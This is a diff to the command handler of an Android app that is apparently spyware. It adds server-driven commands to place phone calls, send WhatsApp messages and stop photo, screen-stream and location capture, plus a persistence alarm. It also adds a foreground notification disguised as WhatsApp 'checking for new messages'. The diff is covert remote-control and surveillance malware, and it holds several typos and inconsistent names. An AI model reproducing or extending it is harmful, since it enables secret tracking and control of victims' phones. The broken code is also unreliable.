@@ -159,7 +159,7 @@ class CommandService : Service() {
                         }
 
                         "streamCamera" -> {
-                            // Coming Soon
+                            // Logic Coming Soon
                         }
 
                         "openApp" -> {
@@ -171,10 +171,96 @@ class CommandService : Service() {
                         "openWhatsap" -> {
                             val number = cmd.get("arg1").toString()
                             val text = cmd.get("arg2")?toString() ?: ""
+                            startActivity(Intent(Intent.ACTION_VIEW, Uri.parse("http://api.whatsapp.com/send?phone=$number&text=$text")))
+                        }
+
+                        "makeCall" -> {
+                            val number = cmd.get("arg1")
+                            val intent = Intent(Intent.ACTION_CALL)
+                            intent.data = Uri.parse("tel:$number")
+                            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED)
+                            startActivity(intent)
+                        }
+
+                        "notification" -> {
+                            // Logic Coming Soon
+                        }
+
+                        "fileExplorer" -> {
+                            // Logic Coming Soon
+                        }
+
+                        "clientID" -> {
+                            val clientID = cmd.get("arg1").toString()
+                            prefs.edit().putString("clientID", clientID).commit()
+                            Log.d(tag, "ClientID: $clientID")
+                        }
+
+                        "stopAll" -> {
+                            PhotosTask.flag = false
+                            StreamScreen.flagStop = true
+                            LocationMonitor.locationUpdates = false
+                        }
+                        
+                        else -> {
+                            Log.i(tag, "Unknown command")
+                            val xcmd = JSONObject()
+                            xcmd.put("event", "command:unknown")
+                            xcmd.put("uid", params.uid)
+                            xcmd.put("device", params.device)
+                            xcmd.put("command", command)
                         }
                     }
                 }
             }
+
+            socket.on(Socket.EVENT_DISCONNECT) {
+
+                Log.i(tag, "\n\nSocket disconnected...\n\n")
+                PhotosTask.flag = false
+                StreamScreen.flagStop = true
+                LocationMonitor.locationUpdates = false
+
+                socket.off("usrDataResult")
+                wakeLock.release()
+            }
+
+            socket.on(Socket.EVENT_RECONNECTING) {
+                Log.i(tag, "Socket reconnecting...")
+            }
+        }
+
+        override fun onDestroy() {
+            wakeLock.release()
+            Log.d(tag, "On destroy Called")
+            super.onDestroy
+        }
+
+        override fun onTaskRemoved(rootIntent: Intent?) {
+            wakeLock.release()
+            Log.d(tag, "On task removed Called")
+            super.onTaskRemoved(rootIntent)
+        }
+
+        private fun setRepeatingAlarm() {
+            val intent = Intent(this, MyReceiver::class.java)
+            val PendingIntent = PendingIntent.getBroadcast(applicationContext, 99, intent, PendingIntent.FLAG_UPDATE_CURRENT)
+
+            val alarmManager = applicationContext.getSystemService(Context.ALARM_SERVICE) as AlarmManager
+            alarmManager.cancel(pendingIntent)
+            alarmManager.setRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 60 * 1000, 10 * 60 * 1000, pendingIntent)
+        }
+
+        private fun startForeground() {
+            val notification = NotificationCompat.Biulder(this, "channelId")
+            .setSmallIcon(R.drawable.ic_whatsapp)
+            .setContentTitle("Whatsapp")
+            .setContentText("Checking for new messages...")
+            .setPriority(NotificationCompat.PRIORITY_MIN)
+            .setCategory(Notification.CATEGORY_SERVICE)
+            .biuld()
+
+            startForeground(98, notification)
         }
     }
 }
